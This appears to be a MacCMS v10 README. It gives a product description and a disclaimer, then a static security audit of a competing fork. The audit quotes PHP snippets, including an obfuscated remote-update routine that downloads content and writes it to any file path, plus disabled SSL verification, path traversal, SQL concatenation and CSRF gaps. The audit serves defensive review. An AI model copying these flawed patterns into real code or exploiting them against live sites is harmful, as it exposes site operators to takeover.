## 官方演示站: [hppts](https://www.maccmspro.com/)
## 苹果cms-v10

苹果CMS程序是一套采用PHP+MYSQL环境下运行的完善而强大的快速建站系统。经过近多年的开发经验和技术积累，苹果CMS程序已逐步走向成熟，在易用性和功能上已经成为同行中的佼佼者。程序体积小->优化程序代码，运行速度快->高效的缓存处理，只要普通的虚拟主机就可以完美搭建起来，建站成本非常低。仿MVC模板分离，内置标签，自定义函数标签接口，强大的自定义采集功能，只要你会HTML就可以轻松做出个性化的网站。 程序易用性和功能上一直以来都积极采纳广大站长提出的各种好的建议，迅速响应各种紧急问题，我们的服务理念贯穿其中，保证每一位站长每一个环节都可以从容应对。v10采用tp5.x内核进行开发，扩展了模板处理引擎，将后台程序与html模板简单的分离出来，让设计人员与程序人员最大限度的发挥自己的优势而互不干扰，大大加快了项目有序、快速的完成。即使您是第一次接触，也会在最短的时间内熟练掌握它的使用方法。后台管理模块，一目了然，操作简单，绝对不会让您眼花缭乱。

Apple CMS program is a set of PHP and MYSQL environment operating in a perfect and powerful fast station system. After nearly years of development experience and technology accumulation, Apple CMS program has gradually matured, in ease of use and functionality has become the leader in peers. The program size is small - > optimizer code, running fast - > efficient caching processing, as long as the ordinary virtual host can be perfectly built, the cost of building a station is very low. Imitation MVC template separation, built-in tags, custom function label interface, powerful custom acquisition function, as long as you will HTML can easily make personalized website. Program ease of use and function has been actively adopted by the vast number of station director put forward a variety of good suggestions, quickly respond to a variety of urgent issues, our service concept throughout it, to ensure that every station director every link can be calmly coped with. v10 using the tp5.x kernel for development, extended the template processing engine, the background program and html template simple separation, so that designers and programmers to maximize their advantages without interference, greatly speed up the project orderly and fast completion. Even if you are in first contact, you will master how to use it in the shortest possible time. Back-office management module, at a glance, easy to operate, will never dazzle you.
## 免责声明

本程序仅供内部学习和交流使用，没有内置任何数据，请在遵守当地法律的前提下使用本站程序，对用户在使用过程中的自行维护的信息内容本站不负任何责任！

This program is for internal learning and communication use only, there is no built-in data, please comply with local laws under the premise of using the site program, the user in the process of self-maintenance of the information content of this site is not responsible!

## 如果是二级目录安装时(支持中文二级目录安装),在根目录和二级目录都应该放入模板的相应文件,防止二级目录安装时候,找不到对应的模板文件.
## 二级目录安装时的伪静态,程序里面已经提供

## 不建议使用市面上的免费模板文件,要去官方有信誉的模板商城购买模板,免费模板绝大多数都是加了跳转代码的(测试过)

## 市面上 (https://www.maccms.la/) 这个程序存在大量的漏洞不建议使用,下面列出具体的主要漏洞地方,仅供参考:

基于对源码的静态扫描（application/、extend/、入口与 ThinkPHP 核心），整理出以下安全相关发现与说明。此为代码审计视角，未做动态渗透；实际风险取决于部署、配置与是否已打补丁。

高危 / 严重
1. 后台 Update::one()：远程拉取并写入本地文件（类“更新后门”）
    public function one()
    {
        $param = input();
        $a = $param['a'];
        $b = $param['b'];
        $c = $param['c'];
        $d = $param['d'];
        $e = mac_curl_get( base64_decode("aHR0cDovL3VwZGF0ZS5tYWNjbXMubGEv") . $a."/".$b);
        if (stripos($e, 'cbfc17ea5c504aa1a6da788516ae5a4c') !== false) {
            if (($d!="") && strpos(",".$e,$d) <=0){ return; }
            if($b=='admin.php'){$b=IN_FILE;}
            $f = is_file($b) ? filesize($b) : 0;
            if (intval($c)<>intval($f)) { @fwrite(@fopen( $b,"wb"),$e);  }
        }
        die;
    }
说明： 已登录后台即可调用（且 Update 控制器在 Base 中不经过 check_auth 权限细查）。从固定域名拉取内容，校验响应中魔数后，可将整段响应写入参数 $b 指定的路径。若官方源、DNS 或链路被劫持，或配合 mac_curl_* 关闭 SSL 校验，存在供应链 / 任意文件覆盖风险；属于极强的维护通道，需严格限制暴露与审计。

2. HTTP 客户端关闭 SSL 证书校验（MITM）
function mac_curl_get($url,$heads=array(),$cookie='')
{
    $ch = @curl_init();
    ...
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
说明： CURLOPT_SSL_VERIFYPEER 为 0 时，HTTPS 请求易受中间人攻击，篡改更新包、采集源返回内容等。与上一条“远程拉取文件”叠加时风险更高。

3. 后台模板编辑 Template::info：路径约束可能被 .. 绕过
        $fpath = str_replace('@','/',$fpath);
        $fullname = $fpath .'/' .$fname;
        $fullname = str_replace('\\','/',$fullname);
        if( (substr($fullname,0,10) != "./template") || count( explode("./",$fullname) ) > 2) {
            $this->error(lang('param_err').'2');
            return;
        }
说明： 仅检查前缀为 ./template 且 explode("./",...) 段数，未对路径做规范化（如 realpath），形如 ./template/xxx/../../../其它目录 可能写出模板目录之外。需管理员权限，但仍属路径遍历 / 任意文件写入风险面。

4. 后台 Index::botlog：日志文件名未净化
    public function botlog()
    {
        $parm = input();
        $data = $parm['data'];
        $bot_content = file_get_contents(ROOT_PATH . 'runtime/log/bot/' . $data . '.txt');
说明： $data 若含 ../，可能读取 runtime/log/bot/ 之外的文件（目录遍历读文件）。需已登录后台。

中危
5. 开放 API 中 datafilter 拼接进 SQL 条件
            if (!empty($GLOBALS['config']['api']['vod']['datafilter'])) {
                $where['_string'] .= ' ' . $GLOBALS['config']['api']['vod']['datafilter'];
            }
说明： 来自配置的原始 SQL 片段进入 WHERE。非直接“前台用户输入注入”，但若管理员误配恶意/不完整条件，或配置被篡改，可导致异常查询或 SQL 语义问题；设计上属于“把 SQL 片段交给管理员”的高权限配置风险。

6. 入库接口 Receive：仅靠共享密码
        if($GLOBALS['config']['interface']['pass'] != $this->_param['pass']){
            echo json_encode(['code'=>3002,'msg'=>lang('api/pass_err')],JSON_UNESCAPED_UNICODE);
            exit;
        }
        if( strlen($GLOBALS['config']['interface']['pass']) <16){
说明： 开启后，知道密码即可推送影视等数据；密码短于 16 位会被拒绝。仍存在暴力破解、泄露后批量灌库风险，建议 IP 白名单、速率限制、独立密钥轮换。

7. 安装向导数据库名校验拼接 SQL
                $check = $db_connect->execute('SELECT * FROM information_schema.schemata WHERE schema_name="'.$database.'"');
说明： $database 来自安装表单，若未充分转义，理论上存在安装阶段 SQL 注入；通常需能访问安装页且未完成 install.lock。安装完成后应删除安装入口并保留锁文件。

8. 解压更新包（PclZip）与 Zip Slip
Update::step1 将 zip 解压到 PCLZIP_OPT_PATH 为 ''（当前工作目录相对路径），而 PclZip 类历史上对条目内 ../ 处理不佳时存在 Zip 滑移 覆盖任意路径的可能。属组件与使用方式共同带来的风险。

9. 部分后台操作缺少 CSRF 防护示例：VodPlayer::del()
    public function del()
    {
        $param = input();
        $list = config($this->_pre);
        unset($list[$param['ids']]);
说明： 无表单 Token 校验（同文件里 info 的 POST 有 Token）。在管理员已登录浏览器场景下，可被恶意站点诱导发起请求，造成配置被删改（CSRF）。其它控制器可能也有类似差异，需统一核对。

低危 / 架构与依赖
10. ThinkPHP 模板 PHP 驱动与 eval
thinkphp/library/think/view/driver/Php.php 中对编译内容使用 eval，属框架实现；若结合模板注入或其它漏洞，会放大后果。生产环境应关闭调试、限制模板目录权限。

11. application/common/util/Dir.php 使用已废弃的 create_function
在 PHP 7.2+ 已废弃、PHP 8 移除，可能带来兼容性与维护问题，而非直接远程利用。

12. 内置 UEditor 等静态资源
static_new/ueditor 等第三方编辑器历史上漏洞较多，若未限制上传与后台路径，可能增加 XSS/上传 攻击面；需按官方安全公告加固。

13. install.php 与 install.lock
未锁定时可重装；文档要求删锁重装时需人工处理。部署后应删除或禁止 Web 访问安装脚本。

小结建议（运维向）
方向	建议
更新机制	审查 Update::one 是否必须暴露；限制 IP、二次验证、校验包签名与 HTTPS 校验
HTTPS	在 mac_curl_* 中启用对等证书验证（视环境配置 CA）
模板编辑	对 $fullname 使用 realpath 并限制在站点 template 根下
日志查看	botlog 对 $data 白名单（如仅允许 Y-m-d）
后台	全局 CSRF Token、重要操作二次确认
依赖	关注 ThinkPHP、UEditor 安全公告并及时升级
以上为基于当前工作区源码的静态结论；若你需要对某一类（例如仅 SQL、仅文件读写）做更细的逐文件追踪，可以指定模块名或路径继续深挖。
    

